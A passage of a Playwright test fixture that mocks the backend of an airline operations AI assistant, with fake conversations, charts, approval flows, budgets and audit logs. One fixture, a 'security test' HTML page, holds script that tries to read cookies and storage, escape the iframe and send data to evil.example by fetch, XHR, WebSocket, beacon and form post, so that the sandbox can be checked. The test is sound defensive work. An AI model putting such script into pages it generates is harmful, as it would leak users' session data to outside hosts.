import type { Page, Route } from '@playwright/test'
import { readFileSync } from 'node:fs'

/**
 * Laravel API'sinin bu senaryo için yeterli sahte hali: akış grafı bellekte tutulur, tuval işlemleri uygulanır,
 * sürüm numarası artar. Doğrulayıcı ve Kestra backend testlerinde (PHPUnit) ayrıca test ediliyor.
 */
type Node = { id: string; kind: string; label: string; title: string | null; settings: Record<string, unknown>; readonly: boolean; raw_type: string | null; writes: boolean; children?: Node[] }

export const fakeUser = {
  id: 1, name: 'Kerem B.', email: 'kerem@freebird.test', title: 'Commercial Lead', role: 'admin', avatar_color: 'crimson', is_active: true,
  must_change_password: false, theme: 'light', locale: 'tr', last_login_at: null, department: { id: 1, name: 'Commercial', slug: 'commercial' },
  abilities: { build: true, admin: true },
}

/** `signedIn: false` ile oturumsuz başlar; giriş ve çıkış oturumu değiştirir. */
export function installFakeBackend(page: Page, options: { signedIn?: boolean; theme?: 'light' | 'dark' | 'system'; now?: Date; evilPage?: boolean; locale?: 'en' | 'tr' } = {}) {
  const { signedIn = true, theme = 'light', now = new Date() } = options
  const catalog = JSON.parse(readFileSync(new URL('../../backend/config/kestra-catalog.json', import.meta.url), 'utf8'))
  const apps = catalog.apps.map((app: Record<string, unknown>) => ({
    ...app,
    required_secrets: [],
    missing_secrets: [],
    available: app.available ?? true,
    connected: ['teams', 'apm', 'email'].includes(app.app as string),
  }))

  const state = {
    signedIn,
    theme,
    locale: options.locale ?? 'tr',
    conversations: [] as { id: number; title: string | null; kind: string; model: null; effective_model: string; usage: { calls: number; tokens: number; cost_usd: number }; messages: unknown[]; created_at: string; updated_at: string }[],
    version: 1,
    feedback: [] as unknown[],
    answers: [] as unknown[],
    messagesSent: [] as unknown[],
    published: null as number | null,
    operations: [] as unknown[],
    approved: false,
    agent: null as null | { status: string; tested: boolean },
    manualRun: false,
    apmDisabled: false,
    stopped: false,
    resolved: false,
    policies: { ai_data_access: 'masked', ai_allow_employee_names: true, allowed_models: ['claude-sonnet-5-5', 'claude-opus-5-5'], default_model: 'claude-sonnet-5-5', data_question_model: 'claude-opus-5-5', fast_model: 'claude-sonnet-5-5', page_model: 'claude-sonnet-5-5', budget_blocks_flow_ai_steps: false, allow_external_recipients: false, allowed_recipient_domains: ['freebird.com.tr', 'gozendigital.com'], max_tool_calls: 20, max_cost_usd: 2, max_seconds: 600 } as Record<string, unknown>,
    audit: [] as { id: number; at: string; actor_type: string; actor: string | null; action: string; subject: string | null; system: string | null; result: string; cost_usd: number | null; meta: Record<string, unknown> | null }[],
    evilPage: options.evilPage ?? false,
    downloads: [] as string[],
    opsBudget: null as { monthly_limit_usd: number; warn_at_percent: number; hard_stop: boolean } | null,
    useful: false,
    graph: {
      flow_id: 'long-delay-notice',
      namespace: 'fortis.chat',
      description: null,
      triggers: [{ id: 'every_15_min', kind: 'trigger_schedule', label: 'Tetikleyici · Zaman', title: 'Her 15 dakikada', settings: { cron: '*/15 * * * *', timezone: 'Europe/Istanbul' }, readonly: false, raw_type: null, writes: false }],
      tasks: [
        { id: 'get_delays', kind: 'data_apm', label: 'Veri · APM', title: 'Rötarlı uçuşları getir', settings: { path: '/api/delays', params: { min_delay_minutes: '240' } }, readonly: false, raw_type: null, writes: false },
        {
          id: 'notify_each', kind: 'foreach', label: 'Döngü', title: 'Her uçuş için', settings: { values: '{{ outputs.get_delays.body }}' }, readonly: false, raw_type: null, writes: false,
          children: [{ id: 'send_mail', kind: 'notify_email', label: 'Bildirim · E-posta', title: 'OCC nöbetçiye e-posta', settings: { to: 'occ@example.com', subject: 'Rötar', message: 'Uzun rötar' }, readonly: false, raw_type: null, writes: true }],
        },
      ] as Node[],
      errors: [],
      finally: [],
    },
  }

  const find = (list: Node[], id: string): Node | undefined => {
    for (const n of list) {
      if (n.id === id) return n
      const inner = find(n.children ?? [], id)
      if (inner) return inner
    }
  }

  const flow = () => ({
    id: 1, flow_id: 'long-delay-notice', namespace: 'fortis.chat', title: 'Uzun rötar bildirimi', status: state.published ? 'active' : 'draft',
    version: state.version, version_source: 'canvas', published_version: state.published, has_draft: state.published !== state.version,
    yaml: 'id: long-delay-notice\nnamespace: fortis.chat\n', graph: state.graph, validation: { ok: true, errors: [], warnings: [], missing_secrets: [] },
  })

  const run = {
    id: 9, flow_id: 1, flow_version_id: 3, conversation_id: null, flow: { namespace: 'fortis.chat.test', flow_id: 'long-delay-notice', title: 'Uzun rötar bildirimi' },
    kestra_execution_id: 'run1', state: 'SUCCESS', finished: true, inputs: {}, started_at: now.toISOString(), ended_at: now.toISOString(), duration: 'PT4S',
    task_runs: [], logs: [], paused: null, created_at: null, is_test: true,
    steps: [
      { task_id: 'get_delays', title: 'Rötarlı uçuşları getir', label: 'Veri · APM', kind: 'data_apm', depth: 0, section: 'tasks', state: 'SUCCESS', runs: 1, started_at: now.toISOString(), duration: 'PT1S', output_summary: 'HTTP 200' },
      { task_id: 'notify_teams', title: null, label: 'Bildirim · Teams', kind: 'notify_teams', depth: 1, section: 'tasks', state: 'SUCCESS', runs: 2, started_at: now.toISOString(), duration: null, output_summary: null },
    ],
  }

  const json = (route: Route, body: unknown, status = 200) => route.fulfill({ status, contentType: 'application/json', body: JSON.stringify(body) })

  const sse = (events: [string, unknown][]) => events.map(([e, d]) => `event: ${e}\ndata: ${JSON.stringify(d)}\n\n`).join('')
  const scope = { id: 's1', kind: 'scope', status: 'done', label: 'İzin kapsamı', detail: "Kerem B. · Admin — 3 bağlı kaynaktan 3'ü kapsamda", sources: [{ key: 'ibs', label: 'IBS', in_scope: true }, { key: 'apm', label: 'APM', in_scope: true }, { key: 'successfactors', label: 'SuccessFactors', in_scope: true }] }
  const model = (id: string, label: string, reason: string) => ({ id, kind: 'model', status: 'done', label: `Model seçildi · Auto → ${label}`, detail: reason, auto: true })
  const legs = { id: 'tu1', kind: 'query', status: 'done', tool: 'query_warehouse', source: 'IBS', purpose: 'Dünkü seferler, rota bazında yük faktörü', rows: 212, total_rows: 212, masked: false, query_id: 'q_legs000001', query: { sql: "SELECT … FROM ires_dim_flt_leg WHERE flight_date = '2026-10-11' …" } }
  const question = { question: '"Kötü performans" nasıl tanımlansın?', context: "Dün 212 sefer buldum. Rotaları sıralamadan önce tanımı netleştirmem gerekiyor.", multi_select: true, allow_other: true, options: [{ label: 'Yük faktörü %82 hedefinin altında', source: 'Tanım' }, { label: 'Rötar oranı ortalamanın üstünde', source: 'APM' }] }

  const questionStream = (content: string) => {
    const user = { id: 101, conversation_id: 10, role: 'user', text: content, stop_reason: null, flow_cards: [], created_at: now.toISOString() }
    const waiting = { id: 's5', kind: 'ask', status: 'waiting', label: 'Bekliyor · Cevabın gerekiyor', detail: question.context }
    const askTrace = [scope, model('s2', 'Claude Sonnet 5.5', 'Genel varsayılan model'), legs, waiting]
    const askMessage = {
      id: 102, conversation_id: 10, role: 'assistant', text: '', stop_reason: 'tool_use', status: 'awaiting_input', flow_cards: [], ask: { questions: [question] }, created_at: now.toISOString(),
      answer: { trace: askTrace, queries: [{ ...legs, at: now.toISOString() }], models: ['claude-sonnet-5-5'], model_labels: ['Claude Sonnet 5.5'], auto: true, duration_ms: 14200, steps: 4, writes: [], citation_mismatch: [] },
    }
    return sse([
      ['user_message', user], ['step', scope], ['step', model('s2', 'Claude Sonnet 5.5', 'Genel varsayılan model')], ['step', { ...legs, status: 'running', rows: undefined }], ['step', legs],
      ['step', waiting],
      ['assistant_message', askMessage], ['ask', { message_id: 102, questions: [question] }], ['done', { conversation: { id: 10, title: 'Dünkü düşük yük faktörlü rotalar' } }],
    ])
  }

  const answerStream = (body: unknown) => {
    state.answers.push(body)
    const user = { id: 103, conversation_id: 10, role: 'user', text: 'Cevaplarım:\n— "Kötü performans" nasıl tanımlansın? = Yük faktörü %82 hedefinin altında', stop_reason: null, flow_cards: [], created_at: now.toISOString() }
    const text = "Dün **beş rota** yük faktöründe %82 hedefinin altında kaldı. En büyük açık **AYT–HAJ** hattında: **%68,4** [^q:q_legs000001].\n\n*Hedefin altındaki rotalar · 11 Eki 2026 · tarifeli*\n\n| Rota | Yük faktörü | Fark |\n|---|---:|---:|\n| AYT–HAJ | %68,4 | -13,6 |\n| AYT–DUS | %71,2 | -10,8 |\n| ADB–STR | %76,5 | -5,5 |\n\nOlası nedenler: AYT–HAJ'da 42 kişilik bir grup iptali görünüyor [^q:q_grp000002].\n\n*Kaynak: IBS (11 Eki 2026, tarifeli seferler).*\n\n:::actions\n- title: AYT–HAJ için grup iptallerini incele | kind: ask\n- title: Özeti #occ-operasyon kanalına gönder | kind: write | system: Teams\n- title: Bunu her sabah otomatik al | kind: automate\n:::"
    const group = { id: 'tu2', kind: 'query', status: 'done', tool: 'query_warehouse', source: 'IBS', purpose: 'AYT–HAJ grup iptalleri', rows: 3, total_rows: 3, masked: true, query_id: 'q_grp000002' }
    const trace = [scope, model('s2', 'Claude Opus 5.5', 'Veri çekme ve çok adımlı karşılaştırma'), group]
    const final = {
      id: 104, conversation_id: 10, role: 'assistant', text, stop_reason: 'end_turn', status: null, flow_cards: [], feedback: null, created_at: now.toISOString(),
      answer: { trace, queries: [{ ...legs, at: now.toISOString() }, { ...group, at: now.toISOString() }], models: ['claude-sonnet-5-5', 'claude-opus-5-5'], model_labels: ['Claude Sonnet 5.5', 'Claude Opus 5.5'], auto: true, duration_ms: 31400, steps: 3, writes: [], citation_mismatch: [] },
    }
    return sse([['user_message', user], ...trace.map((step) => ['step', step] as [string, unknown]), ['delta', { text: 'Dün **beş rota**' }], ['assistant_message', final], ['done', { conversation: { id: 10, title: 'Dünkü düşük yük faktörlü rotalar' } }]])
  }

  // Grafikli cevap (sohbet grafikleri): bir line, bir hbar. Veri sunucunun doğruladığı answer.charts'tan çizilir.
  const days = Array.from({ length: 14 }, (_, i) => new Date(Date.UTC(2026, 8, 28 + i)).toISOString().slice(0, 10))
  const flightsChart = {
    type: 'line', title: 'Günlük yolcu sayısı, son 14 gün', source: 'q:q_sefer00001',
    x: { field: 'flight_date', type: 'date', label: 'Tarih' }, y: { unit: 'adet', label: 'Yolcu', min: 0 },
    // Birbirine yakın iki seri: çizgi sonu etiketleri üst üste binmemeli.
    series: [{ name: 'Check-in', field: 'checkin' }, { name: 'Uçağa biniş', field: 'boarded' }],
    data: days.map((d, i) => ({ flight_date: d, checkin: [5420, 5060, 5770, 7720, 10790, 9740, 6930, 5650, 6680, 5870, 8420, 10770, 10740, 8150][i], boarded: [5290, 4920, 5600, 7240, 10540, 9250, 6420, 5500, 6360, 5730, 8200, 10330, 10290, 7900][i] })),
    reference: null, derived: false, note: 'Türkiye saatine göre.',
  }
  const reasonsChart = {
    type: 'hbar', title: 'Dün rötar nedenleri (dakika)', source: 'q:q_neden0001',
    x: { field: 'reason', type: 'category', label: 'Neden' }, y: { unit: 'dk', label: 'Toplam rötar', min: null },
    series: [{ name: 'Rötar', field: 'minutes' }],
    data: [{ reason: 'Uçağın geç gelmesi (93)', minutes: 412 }, { reason: 'Yer hizmetleri (13)', minutes: 186 }, { reason: 'Hava trafik kontrolü (81)', minutes: 143 }, { reason: 'Teknik (41)', minutes: 95 }, { reason: 'Hava durumu (71)', minutes: 38 }],
    reference: null, derived: false, note: null,
  }
  const chartConversation = () => {
    const text = `Son 14 günde günlük yolcu **4.920–10.790** arasında; hafta sonları belirgin yükseliyor [^q:q_sefer00001].\n\n:::chart\n${JSON.stringify(flightsChart)}\n:::\n\nDünkü rötarın yarıya yakını **uçağın geç gelmesinden** (412 dk); yer hizmetleri ikinci sırada [^q:q_neden0001].\n\n:::chart\n${JSON.stringify(reasonsChart)}\n:::`
    const queries = [
      { tool: 'query_warehouse', source: 'IBS', purpose: 'Son 14 gün, günlük yolcu', query_id: 'q_sefer00001', rows: 14, total_rows: 14, masked: false, at: now.toISOString() },
      { tool: 'query_apm', source: 'APM', purpose: 'Dünkü rötar nedenleri', query_id: 'q_neden0001', rows: 5, total_rows: 5, masked: false, at: now.toISOString() },
    ]
    return {
      id: 20, title: 'Sefer sayısı ve rötar nedenleri', kind: 'chat', model: null, effective_model: 'claude-sonnet-5-5', usage: { calls: 3, tokens: 9000, cost_usd: 0.12 }, created_at: '', updated_at: '',
      messages: [
        { id: 201, conversation_id: 20, role: 'user', text: 'Son 14 günün günlük yolcu sayısı ve dünkü rötar nedenleri', stop_reason: null, flow_cards: [], created_at: now.toISOString() },
        {
          id: 202, conversation_id: 20, role: 'assistant', text, stop_reason: 'end_turn', status: null, flow_cards: [], feedback: null, created_at: now.toISOString(),
          answer: { trace: [scope], queries, models: ['claude-sonnet-5-5'], model_labels: ['Claude Sonnet 5.5'], auto: true, duration_ms: 18200, steps: 1, writes: [], citation_mismatch: [], charts: [flightsChart, reasonsChart] },
        },
      ],
    }
  }

  // Sohbette HTML sayfa (H1): normal pano (2 grafik + filtre) ve güvenlik denemesi yapan kötü niyetli sayfa.
  const panoData = {
    'q:q_pano00001': {
      source: 'APM', purpose: 'Son 7 gün, günlük sefer ve OTP', at: now.toISOString(), total_rows: 7, truncated: false,
      columns: ['flight_date', 'flights', 'otp_pct'],
      rows: [['2026-10-05', 54, 82.4], ['2026-10-06', 50, 79.1], ['2026-10-07', 55, 85.0], ['2026-10-08', 47, 88.2], ['2026-10-09', 59, 76.5], ['2026-10-10', 78, 81.0], ['2026-10-11', 73, 84.3]],
    },
    'q:q_pano00002': {
      source: 'APM', purpose: 'Dün meydanlara göre rötar', at: now.toISOString(), total_rows: 6, truncated: false,
      columns: ['airport', 'reason', 'minutes'],
      rows: [['AYT', 'Uçağın geç gelmesi', 212], ['AYT', 'Yer hizmetleri', 96], ['SAW', 'Uçağın geç gelmesi', 140], ['SAW', 'Teknik', 55], ['ADB', 'Hava trafik', 61], ['ADB', 'Uçağın geç gelmesi', 60]],
    },
  }
  const panoHtml = `<style>.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:16px}.card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:12px}.kpi{font-size:28px;font-weight:600}</style>
<h2>Operasyon panosu · son 7 gün</h2>
<div class="grid"><div class="card"><div>Toplam sefer</div><div class="kpi" id="total"></div></div><div class="card"><div>Ortalama OTP</div><div class="kpi" id="otp"></div></div></div>
<div class="grid" style="margin-top:16px"><div class="card"><h3>Günlük sefer</h3><canvas id="flights"></canvas></div><div class="card"><h3>Meydana göre rötar (dk)</h3><label>Meydan <select id="airport"><option value="">Hepsi</option></select></label><div id="delays"></div><div id="table"></div></div></div>
<script>
const days = fortis.data('q:q_pano00001');
const delays = fortis.data('q:q_pano00002');
document.getElementById('total').textContent = fortis.formatNumber(days.reduce((a, r) => a + r.flights, 0), 0);
document.getElementById('otp').textContent = '%' + fortis.formatNumber(days.reduce((a, r) => a + r.otp_pct, 0) / days.length);
fortis.chart('#flights', { type: 'line', data: { labels: days.map(r => fortis.formatDate(r.flight_date)), datasets: [{ label: 'Sefer', data: days.map(r => r.flights) }] }, options: { plugins: { legend: { display: false } } } });
const select = document.getElementById('airport');
[...new Set(delays.map(r => r.airport))].forEach(a => select.add(new Option(a, a)));
let chart;
function draw() {
  const rows = delays.filter(r => !select.value || r.airport === select.value);
  const byReason = {}; rows.forEach(r => byReason[r.reason] = (byReason[r.reason] || 0) + r.minutes);
  if (chart) chart.destroy();
  chart = fortis.chart('#delays', { type: 'bar', data: { labels: Object.keys(byReason), datasets: [{ label: 'Rötar (dk)', data: Object.values(byReason) }] }, options: { indexAxis: 'y', plugins: { legend: { display: false } } } });
  fortis.table('#table', rows, [{ key: 'airport', label: 'Meydan' }, { key: 'reason', label: 'Neden' }, { key: 'minutes', label: 'Dakika', format: 'number' }]);
}
select.addEventListener('change', draw); draw();
</script>
<button id="ask" onclick="fortis.ask('AYT rötarlarının nedenlerini ayrıntılandır')">Fortis'e sor</button>`
  // Sunucu temizliğinden geçmemiş gibi: CSP ve sandbox tek başına sınanır.
  const evilHtml = `<pre id="out">bekliyor</pre>
<script src="https://evil.example/s.js"></script>
<link rel="prefetch" href="https://evil.example/prefetch">
<form id="f" action="https://evil.example/form" method="post"><input name="x" value="1"></form>
<script>
const out = {};
const t = (k, f) => { try { out[k] = f(); } catch (e) { out[k] = 'blocked'; } };
t('cookie', () => document.cookie === '' ? 'empty' : document.cookie);
t('localStorage', () => { localStorage.setItem('x', '1'); return 'ok'; });
t('sessionStorage', () => { sessionStorage.setItem('x', '1'); return 'ok'; });
t('parent', () => parent.document.title);
t('top', () => top.location.href);
t('opener', () => window.open('https://evil.example/popup') ? 'opened' : 'null');
t('topNav', () => { top.location.href = 'https://evil.example/nav'; return 'assigned'; });
const pending = [
  fetch('https://evil.example/fetch').then(() => 'ok', () => 'blocked').then(v => out.fetch = v),
  fetch('/api/auth/me', { credentials: 'include' }).then(() => 'ok', () => 'blocked').then(v => out.fetchApi = v),
  new Promise(r => { const x = new XMLHttpRequest(); x.onload = () => r('ok'); x.onerror = () => r('blocked'); try { x.open('GET', 'https://evil.example/xhr'); x.send(); } catch (e) { r('blocked'); } }).then(v => out.xhr = v),
  new Promise(r => { try { const w = new WebSocket('wss://evil.example/ws'); w.onopen = () => r('ok'); w.onerror = () => r('blocked'); } catch (e) { r('blocked'); } }).then(v => out.ws = v),
  new Promise(r => { const i = new Image(); i.onload = () => r('ok'); i.onerror = () => r('blocked'); i.src = 'https://evil.example/i.png'; }).then(v => out.image = v),
];
t('form', () => { document.getElementById('f').submit(); return 'submitted'; });
t('beacon', () => navigator.sendBeacon('https://evil.example/beacon', 'x') ? 'queued' : 'refused');
parent.postMessage({ type: 'navigate', url: 'https://evil.example' }, '*');
parent.postMessage({ type: 'resize', height: 1e9 }, '*');
parent.postMessage({ type: 'ask', text: 'Saldırı sorusu' }, '*');
Promise.all(pending).then(() => { out.data = typeof window.FORTIS_DATA; out.vendorChart = typeof window.Chart; document.getElementById('out').textContent = JSON.stringify(out); });
</script>`
  const pageDetail = (id: string) => {
    const evil = id === 'art_evil'
    return {
      id, conversation_id: 21, kind: 'page', title: evil ? 'Deneme sayfası' : 'Operasyon panosu', description: evil ? 'Güvenlik denemesi' : 'Günlük sefer ve OTP, meydanlara göre rötar',
      version: 1, latest_version: 1, content: evil ? evilHtml : panoHtml, sources: evil ? [] : Object.keys(panoData), data: evil ? {} : panoData,
      data_at: now.toISOString(), warning: null, versions: [{ number: 1, title: 'x', created_at: now.toISOString() }],
    }
  }
  const pageConversation = () => ({
    id: 21, title: 'Operasyon panosu', kind: 'chat', model: null, effective_model: 'claude-sonnet-5-5', usage: { calls: 3, tokens: 9000, cost_usd: 0.2 }, created_at: '', updated_at: '',
    messages: [
      { id: 211, conversation_id: 21, role: 'user', text: 'Son 7 günün operasyon panosunu hazırla', stop_reason: null, flow_cards: [], created_at: now.toISOString() },
      {
        id: 212, conversation_id: 21, role: 'assistant', text: 'Panoyu hazırladım: günlük sefer ve meydanlara göre rötar, meydan filtresiyle.', stop_reason: 'end_turn', status: null, feedback: null, created_at: now.toISOString(),
        flow_cards: state.evilPage
          ? [{ type: 'artifact', artifact_id: 'art_evil', version: 1, title: 'Deneme sayfası', kind: 'page', description: 'Güvenlik denemesi', sources: [], data_at: now.toISOString(), warning: null }]
          : [{ type: 'artifact', artifact_id: 'art_pano', version: 1, title: 'Operasyon panosu', kind: 'page', description: 'Günlük sefer ve OTP, meydanlara göre rötar', sources: Object.keys(panoData), data_at: now.toISOString(), warning: null }],
        answer: null,
      },
    ],
  })

  const inboxItem = () => ({
    id: 1, type: 'approval', title: 'Sigorta bildirimi', body: 'occ@freebird.com.tr adresine gönderilecek e-posta onay bekliyor.', source_label: 'Sabah Operasyon Özeti',
    icon: 'SO', status: state.approved ? 'done' : 'open', actionable: !state.approved, subject_type: 'agent_action', snoozed_until: null, read: false,
    created_at: new Date(now.getTime() - 12 * 60_000).toISOString(),
  })
  const inboxDetail = () => ({
    ...inboxItem(),
    read: true,
    detail: {
      kind: 'action',
      action: {
        id: 5, type: 'send_email', status: state.approved ? 'executed' : 'pending', reason: 'Dünkü rötarlar sigorta bildirim eşiğini aştı.', result: null,
        payload: { to: ['occ@freebird.com.tr'], subject: 'Sigorta bildirimi · 11 Eki', body_markdown: 'Dün **3 uçuş** 4 saatten uzun rötar yaptı.\n\n| Uçuş | Rötar |\n|---|---:|\n| FH123 | 4 sa 12 dk |' },
      },
      run: { id: 3, agent: { id: 1, name: 'Sabah Operasyon Özeti', status: 'live', icon: 'SO' }, status: 'waiting_approval', is_test: false, started_at: now.toISOString(), summary: null, output: null, conversation_id: 10, cost_usd: 0.03 },
      what_happens: ['E-posta fortis@freebird.com.tr adresinden occ@freebird.com.tr adresine gönderilir.', 'Bu işlem senin adınla denetim kaydına yazılır.'],
      can_decide: true, editable_recipients: true, recipient_domains: ['freebird.com.tr'], allowed_recipients: [],
    },
  })

  const testRun = () => ({
    id: 31, agent: { id: 7, name: 'Sabah Operasyon Özeti' }, status: 'waiting_approval', is_test: true, input: 'Dünkü operasyon özetini hazırla ve gönder.',
    summary: 'Dün 142 uçuş, %84 zamanında kalkış.', output: 'Dün **142 uçuş** yapıldı, kalkışta zamanındalık **%84**.\n\n| Sefer | Rötar |\n|---|---:|\n| FH1256 | 142 dk |',
    error: null, cost_usd: 0.214, conversation_id: 80, started_at: now.toISOString(), finished_at: now.toISOString(),
    actions: [{ id: 1, type: 'send_email', status: 'preview', requires_approval: true, payload: { to: ['kerem@freebird.com.tr'], subject: 'Operasyon özeti · 11 Eki' }, reason: null }],
  })
  const zeroTypes = { chat: 0, agent: 0, page: 0, title: 0, evaluation: 0, eval: 0, flow: 0 }
  const usageReport = () => ({
    range: { from: '2026-10-01', to: '2026-10-11' },
    totals: { calls: 412, cost_usd: 18.42, input_tokens: 2_310_000, output_tokens: 96_400 },
    daily: Array.from({ length: 11 }, (_, i) => ({ date: `2026-10-${String(i + 1).padStart(2, '0')}`, ...zeroTypes, chat: [0.9, 1.2, 0.4, 0.3, 1.6, 1.1, 1.4, 0.8, 1.3, 1.5, 0.7][i], agent: [0.3, 0.4, 0.1, 0, 0.5, 0.6, 0.4, 0.3, 0.5, 0.6, 0.2][i], eval: i === 6 ? 0.79 : 0 })),
    by_type: [
      { type: 'chat', label: 'Sohbet', calls: 318, cost_usd: 11.2 },
      { type: 'agent', label: 'Agent', calls: 71, cost_usd: 5.94 },
      { type: 'eval', label: 'Eval', calls: 12, cost_usd: 0.79 },
      { type: 'title', label: 'Başlık', calls: 11, cost_usd: 0.49 },
    ],
    by_department: [
      { id: 1, name: 'Operasyon', calls: 270, cost_usd: 12.1 },
      { id: 2, name: 'Ticari', calls: 120, cost_usd: 5.6 },
      { id: null, name: 'Departmansız', calls: 22, cost_usd: 0.72 },
    ],
    by_model: [
      { model: 'claude-sonnet-5-5', label: 'Sonnet 5.5', calls: 380, cost_usd: 15.9 },
      { model: 'claude-haiku-5-5', label: 'Haiku 5.5', calls: 32, cost_usd: 2.52 },
    ],
    top_agents: [
      { id: 7, name: 'Sabah Operasyon Özeti', runs: 11, cost_usd: 3.1 },
      { id: 8, name: 'Uzun Rötar Bildirimi', runs: 24, cost_usd: 2.84 },
    ],
    top_users: [
      { id: 1, name: 'Kerem B.', department: 'Ticari', calls: 120, cost_usd: 5.6 },
      { id: 3, name: 'Selin A.', department: 'Operasyon', calls: 98, cost_usd: 4.2 },
    ],
    rows_total: 412,
    rows: [
      { id: 412, at: '2026-10-11T08:40:00+00:00', user: 'Selin A.', department: 'Operasyon', type: 'chat', purpose: null, model: 'claude-sonnet-5-5', input_tokens: 6120, output_tokens: 340, cost_usd: 0.0235 },
      { id: 411, at: '2026-10-11T06:00:00+00:00', user: 'Kerem B.', department: 'Ticari', type: 'agent', purpose: null, model: 'claude-sonnet-5-5', input_tokens: 18400, output_tokens: 910, cost_usd: 0.0689 },
      { id: 410, at: '2026-10-10T15:12:00+00:00', user: 'Kerem B.', department: 'Ticari', type: 'title', purpose: 'title', model: 'claude-haiku-5-5', input_tokens: 220, output_tokens: 12, cost_usd: 0.0003 },
    ],
    options: {
      departments: [{ id: 1, name: 'Operasyon' }, { id: 2, name: 'Ticari' }],
      users: [{ id: 1, name: 'Kerem B.' }, { id: 3, name: 'Selin A.' }],
      models: [{ id: 'claude-sonnet-5-5', label: 'Sonnet 5.5' }, { id: 'claude-haiku-5-5', label: 'Haiku 5.5' }],
      types: [['chat', 'Sohbet'], ['agent', 'Agent'], ['title', 'Başlık'], ['evaluation', 'Puanlama'], ['eval', 'Eval'], ['flow', 'Akış adımı']].map(([id, label]) => ({ id, label })),
    },
    credit_usd_value: null,
  })
  const budgetsData = () => ({
    month: 'Ekim 2026',
    org: { id: 1, monthly_limit_usd: 50, warn_at_percent: 80, hard_stop: false, spent_usd: 18.42, ratio: 0.3684 },
    departments: [
      { id: 1, name: 'Operasyon', budget: state.opsBudget ? { id: 2, ...state.opsBudget, spent_usd: 12.1, ratio: 12.1 / state.opsBudget.monthly_limit_usd } : null, spent_usd: 12.1 },
      { id: 2, name: 'Ticari', budget: null, spent_usd: 5.6 },
    ],
    users: [],
    credit_usd_value: null,
    blocks_flow_ai_steps: false,
  })
  const policiesData = () => ({
    ...state.policies,
    model_catalog: [
      { id: 'claude-sonnet-5-5', label: 'Claude Sonnet 5.5', strength: 'Dengeli, çoğu iş için varsayılan', input_per_mtok: 2, output_per_mtok: 10 },
      { id: 'claude-opus-5-5', label: 'Claude Opus 5.5', strength: 'Çok adımlı derin analiz', input_per_mtok: 4, output_per_mtok: 20 },
    ],
    max_rows: 200,
    max_chars: 40000,
    approval_policy: [
      { tool: 'send_email', label: 'E-posta gönder', mode: 'always' },
      { tool: 'post_teams', label: "Teams'e mesaj", mode: 'always' },
      { tool: 'deliver_report', label: 'Rapor teslim et', mode: 'always' },
    ],
    company_budget: { monthly_limit_usd: 50, warn_at_percent: 80, hard_stop: true },
  })
  const baseAudit = () => [
    { id: 3, at: '2026-10-11T07:40:00+00:00', actor_type: 'agent', actor: 'Sabah Operasyon Özeti', action: 'agent.tool_blocked', subject: 'AgentRun #31', system: 'apm', result: 'blocked', cost_usd: null, meta: { tool: 'query_successfactors', reason: 'Agent bu araca yetkili değil.' } },
    { id: 2, at: '2026-10-11T06:00:00+00:00', actor_type: 'user', actor: 'Selin A.', action: 'ai.query', subject: 'Conversation #12', system: 'apm', result: 'allowed', cost_usd: 0.0235, meta: { tool: 'query_apm', purpose: 'Dünün en uzun rötarları', rows_returned: 10 } },
    { id: 1, at: '2026-10-10T21:15:00+00:00', actor_type: 'system', actor: 'Sistem', action: 'auth.login_failed', subject: null, system: null, result: 'failed', cost_usd: null, meta: { email: 'k***@freebird.com.tr' } },
  ]
  const governance = () => ({
    live: [
      ...(state.stopped ? [] : [{ kind: 'agent', id: '31', name: 'Sabah Operasyon Özeti', link: '#/agents/7/runs/31', started_by: 'Kerem B.', status: 'running', is_test: true, started_at: now.toISOString(), seconds: 95, tool_calls: 21, cost_usd: 0.42 }]),
      { kind: 'agent', id: '33', name: 'Uzun Rötar Bildirimi', link: '#/agents/8/runs/33', started_by: 'Olay', status: 'waiting_approval', is_test: false, started_at: now.toISOString(), seconds: 2400, tool_calls: 6, cost_usd: 0.18 },
      { kind: 'flow', id: 'run-paused', name: 'Sigorta bildirimi', link: '#/runs/run-paused', started_by: 'Zamanlama', status: 'paused', is_test: false, started_at: now.toISOString(), seconds: 720, tool_calls: null, cost_usd: 0 },
    ],
    month: { label: 'Ekim 2026', spent_usd: 18.42, budget_usd: 50, ratio: 0.3684, previous_same_period_usd: 14.1, change_pct: 31, questions: 412, agent_runs: 64, actions_approved: 41, actions_rejected: 3 },
    alerts: [
      ...(state.resolved ? [] : [{ id: 9, type: 'agent_limit', severity: 'critical', message: 'Sabah Operasyon Özeti çalışması #31 (test): Araç çağrısı sınırı (20) aşıldı; çalışma durduruldu.', link: '#/agents/7/runs/31', created_at: now.toISOString(), updated_at: new Date(now.getTime() - 4 * 60_000).toISOString(), resolved_at: null, resolved_by: null }]),
      { id: 10, type: 'connector_attention', severity: 'warning', message: 'SuccessFactors bağlantısı 30 dakikadan uzun süredir dikkat istiyor: Son kontrol başarısız.', link: '#/connectors/successfactors', created_at: now.toISOString(), updated_at: new Date(now.getTime() - 12 * 60_000).toISOString(), resolved_at: null, resolved_by: null },
      { id: 11, type: 'approval_overdue', severity: 'warning', message: '"Sigorta bildirimi onay bekliyor" onayı 26 saattir bekliyor (Akışlar).', link: null, created_at: now.toISOString(), updated_at: new Date(now.getTime() - 30 * 60_000).toISOString(), resolved_at: null, resolved_by: null },
    ],
    quality: { eval: { run_at: new Date(now.getTime() - 2 * 3600_000).toISOString(), questions: 26, passed: 25, correct_tool_ratio: 0.96, cost_usd: 3.18 }, agent_score_avg: 87, scored_runs: 42, agents: [{ id: 8, name: 'Uzun Rötar Bildirimi', score_avg: 72, runs: 9 }, { id: 7, name: 'Sabah Operasyon Özeti', score_avg: 91, runs: 30 }] },
  })
  const connector = (key: string, label: string, abbr: string, category: string, status: string, scopes: string[], description: string, extra: Record<string, unknown> = {}) => ({
    key, label, abbr, category, description, status, detail: null, enabled: true, scopes, last_checked_at: category === 'setup' || status === 'not_configured' ? null : new Date(now.getTime() - 3 * 60_000).toISOString(), uses_this_week: 0, ...extra,
  })
  const connectorList = () => [
    connector('ibs', 'IBS', 'IB', 'data', 'connected', ['read'], 'Rezervasyon, satış, sefer ve kapasite verisi (veri ambarı, salt okunur).', { uses_this_week: 41 }),
    connector('apm', 'APM', 'AP', 'data', state.apmDisabled ? 'disabled' : 'connected', ['read', 'events'], 'Uçuşlar, rötarlar, uçaklar ve zamanındalık (REST API, salt okunur).', { uses_this_week: 87, enabled: !state.apmDisabled }),
